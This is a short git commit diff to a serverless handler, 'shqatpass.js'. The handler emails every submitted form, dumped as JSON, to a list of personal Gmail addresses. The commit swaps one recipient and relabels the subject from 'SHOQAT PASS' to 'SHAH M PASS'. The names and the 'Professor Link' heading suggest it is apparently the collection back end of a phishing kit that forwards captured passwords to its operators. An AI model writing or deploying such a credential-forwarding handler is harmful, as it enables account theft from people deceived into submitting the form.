c3a7624664b9265b4c5c385f0e65c76d72ee44e4
ejefkmnhhj-cmyk <ejefkmnhhj@gmail.com>
2025-12-25 16:29:13 +0500

    Update shqatpass.js

--- shqatpass.js
+++ shqatpass.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,ramzanlund556677@gmail.com",
-      subject: "SHOQAT PASS",
+      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,lizzaajesson@gmail.com",
+      subject: "SHAH M PASS",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
